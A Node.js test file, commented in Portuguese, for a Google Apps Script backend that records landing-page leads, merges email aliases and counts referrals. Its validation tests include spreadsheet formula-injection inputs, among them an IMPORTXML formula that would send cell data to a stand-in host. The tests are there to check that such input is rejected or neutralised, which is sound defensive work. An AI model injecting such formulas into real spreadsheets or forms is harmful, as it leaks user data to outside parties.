/* Testes da lógica do Code.gs, sem precisar do Google.
   Rodar:  node landing/backend/apps-script/test.mjs                                   */
import fs from "node:fs";
import path from "node:path";
import vm from "node:vm";
import { fileURLToPath } from "node:url";

const here = path.dirname(fileURLToPath(import.meta.url));
const code = fs.readFileSync(path.join(here, "Code.gs"), "utf8");

/* ---- stubs mínimos das APIs do Google, só para o doPost ---- */
let lastLockReleased = 0;
const ctx = vm.createContext({
  console: { ...console, error() {} }, // o Code.gs registra erros esperados (envio falho, JSON inválido)
  ContentService: { createTextOutput: (t) => ({ text: t, setMimeType() { return this; } }), MimeType: { JSON: "json" } },
  LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() { lastLockReleased++; } }) },
  SpreadsheetApp: null, MailApp: null, PropertiesService: null, Session: null,
});
vm.runInContext(code, ctx);
const L = vm.runInContext("({ handleLead, emailKey, validate, safeCell, retryPendingNotifications_, doPost, doGet, HEADERS, COL, THRESHOLD })", ctx);

class FakeSheet {
  constructor() { this.rows = [L.HEADERS.slice()]; }
  getDataRange() { return { getValues: () => this.rows.map((r) => r.slice()) }; }
  appendRow(a) { this.rows.push(a.slice()); }
  getRange(r, c) { return { setValue: (v) => { this.rows[r - 1][c - 1] = v; } }; }
  byEmail(e) { return this.rows.find((r, i) => i > 0 && r[L.COL.email] === e); }
}
function setup(opts = {}) {
  const sheet = new FakeSheet();
  const mails = [];
  let t = 0;
  const deps = {
    sheet, owner: "dono@exemplo.com", now: () => new Date(Date.UTC(2026, 10, 21, 12, 0, t++)),
    random: (() => { let s = 7; return () => { s = (s * 16807) % 2147483647; return s / 2147483647; }; })(),
    mail: opts.failMail ? () => { throw new Error("cota de e-mail excedida"); } : (to, subject, body) => mails.push({ to, subject, body }),
  };
  return { sheet, mails, deps, lead: (p) => L.handleLead({ source: "landing-promocao", ...p }, deps) };
}

let pass = 0, fail = 0;
const ok = (name, cond, extra = "") => { cond ? pass++ : fail++; console.log((cond ? "PASS " : "FAIL ") + name + (!cond && extra ? "  → " + extra : "")); };

/* 1. inscrição nova */
{
  const { sheet, lead } = setup();
  const r = lead({ email: "Ana@Gmail.com", name: "Ana Souza", level: "A2" });
  ok("inscrição nova devolve ok + código no formato", r.ok && /^ANASO-[A-Z2-9]{4}$/.test(r.referralCode), JSON.stringify(r));
  const row = sheet.byEmail("Ana@Gmail.com");
  ok("grava a linha com nível, origem e contagem 0", row && row[L.COL.level] === "A2" && row[L.COL.source] === "landing-promocao" && row[L.COL.referralCount] === 0);
  const r2 = lead({ email: "Ana@Gmail.com", name: "Outro Nome" });
  ok("mesmo e-mail de novo: mesmo código, sem linha nova", r2.referralCode === r.referralCode && r2.existing === true && sheet.rows.length === 2);
}

/* 2. aliases do mesmo e-mail */
{
  const { sheet, lead } = setup();
  const a = lead({ email: "ana@gmail.com" });
  const b = lead({ email: "a.na+promo@gmail.com" });
  ok("alias do Gmail (pontos e +tag) é a mesma pessoa", a.referralCode === b.referralCode && sheet.rows.length === 2);
  const c = lead({ email: "ana@outlook.com" });
  ok("outro domínio é outra pessoa", c.referralCode !== a.referralCode && sheet.rows.length === 3);
}

/* 3. contagem de indicações */
{
  const { sheet, mails, lead } = setup();
  const dono = lead({ email: "dono.ref@gmail.com", name: "Bia" });
  lead({ email: "dono.ref@gmail.com", ref: dono.referralCode }); // a pessoa reenvia o próprio e-mail com o próprio código
  lead({ email: "d.ono.ref+x@gmail.com", ref: dono.referralCode }); // ...ou um alias dele
  ok("auto-indicação (e-mail dela, mesmo com alias) é ignorada", sheet.byEmail("dono.ref@gmail.com")[L.COL.referralCount] === 0 && sheet.rows.length === 2);
  lead({ email: "x1@gmail.com", ref: "CODIGO-FALSO" });
  ok("código inexistente não conta e não grava referredBy", sheet.byEmail("x1@gmail.com")[L.COL.referredBy] === "");
  lead({ email: "f1@gmail.com", ref: dono.referralCode });
  lead({ email: "f1@gmail.com", ref: dono.referralCode });
  lead({ email: "f1+outro@gmail.com", ref: dono.referralCode });
  ok("amigo repetido (e alias dele) não conta duas vezes", sheet.byEmail("dono.ref@gmail.com")[L.COL.referralCount] === 1);
  lead({ email: "f2@gmail.com", ref: dono.referralCode });
  ok("2 indicados: ainda sem e-mail", mails.length === 0 && sheet.byEmail("dono.ref@gmail.com")[L.COL.referralCount] === 2);
  lead({ email: "f3@gmail.com", ref: dono.referralCode });
  ok("3º indicado dispara exatamente 1 e-mail ao dono", mails.length === 1 && mails[0].to === "dono@exemplo.com");
  const m = mails[0];
  ok("e-mail cita quem indicou, o código e os 3 indicados", /Bia/.test(m.body) && m.body.includes(dono.referralCode) && ["f1@gmail.com", "f2@gmail.com", "f3@gmail.com"].every((e) => m.body.includes(e)) && /3 indicações/.test(m.subject), m.body);
  ok("marca notifiedAt", !!sheet.byEmail("dono.ref@gmail.com")[L.COL.notifiedAt]);
  lead({ email: "f4@gmail.com", ref: dono.referralCode });
  lead({ email: "f5@gmail.com", ref: dono.referralCode });
  ok("4º e 5º indicados contam mas não geram novo e-mail", mails.length === 1 && sheet.byEmail("dono.ref@gmail.com")[L.COL.referralCount] === 5);
}

/* 4. falha no envio não derruba a inscrição, e dá para tentar de novo */
{
  const { sheet, deps, lead } = setup({ failMail: true });
  const dono = lead({ email: "dona@gmail.com", name: "Cris" });
  lead({ email: "a1@gmail.com", ref: dono.referralCode });
  lead({ email: "a2@gmail.com", ref: dono.referralCode });
  const r = lead({ email: "a3@gmail.com", ref: dono.referralCode });
  ok("e-mail falhou: a inscrição do 3º amigo funciona mesmo assim", r.ok === true);
  ok("e-mail falhou: notifiedAt continua vazio (para retentar)", !sheet.byEmail("dona@gmail.com")[L.COL.notifiedAt]);
  const mails = [];
  deps.mail = (to, s, b) => mails.push({ to, s, b });
  ok("retryPendingNotifications reenvia 1 aviso", L.retryPendingNotifications_(deps) === 1 && mails.length === 1);
  ok("e não reenvia de novo", L.retryPendingNotifications_(deps) === 0 && mails.length === 1);
}

/* 5. validação e segurança */
{
  const { sheet, lead } = setup();
  ok("e-mail inválido é recusado", lead({ email: "sem-arroba" }).ok === false);
  ok("e-mail vazio é recusado", lead({ email: "" }).ok === false);
  ok("e-mail enorme é recusado", lead({ email: "a".repeat(300) + "@x.com" }).ok === false);
  ok("e-mail que começaria com = (fórmula) é recusado", lead({ email: '=IMPORTXML("http://x"&A1)@x.co' }).ok === false);
  ok("payload nulo é recusado", L.handleLead(null, setup().deps).ok === false);
  lead({ email: "ok@gmail.com", name: "=HYPERLINK(\"http://x\")", level: "Z9" });
  const row = sheet.byEmail("ok@gmail.com");
  ok("nome que parece fórmula ganha apóstrofo", row[L.COL.name].startsWith("'="));
  ok("nível fora da lista vira vazio", row[L.COL.level] === "");
  lead({ email: "c1@gmail.com", level: "C1" });
  ok("nível C1 (Avançado) é aceito", sheet.byEmail("c1@gmail.com")[L.COL.level] === "C1");
  lead({ email: "n@gmail.com", name: "N".repeat(200) });
  ok("nome é cortado em 60 caracteres", sheet.byEmail("n@gmail.com")[L.COL.name].length === 60);
  lead({ email: "s@gmail.com", source: "hackeado" });
  ok("origem fora da lista vira 'outro'", sheet.byEmail("s@gmail.com")[L.COL.source] === "outro");
}

/* 6. doPost de ponta a ponta (corpo text/plain com JSON, como a landing envia) */
{
  const { deps } = setup();
  // doPost usa realDeps_ (APIs do Google). Aqui só validamos o tratamento de entrada inválida.
  const bad = L.doPost({ postData: { contents: "não é json" } });
  const parsed = JSON.parse(bad.text);
  ok("doPost com corpo inválido devolve ok:false (HTTP 200) e solta o lock", parsed.ok === false && lastLockReleased === 1, bad.text);
  ok("doGet responde saúde do serviço", JSON.parse(L.doGet().text).ok === true);
}

console.log(`\n${pass}/${pass + fail} verificações passaram`);
process.exit(fail ? 1 : 0);
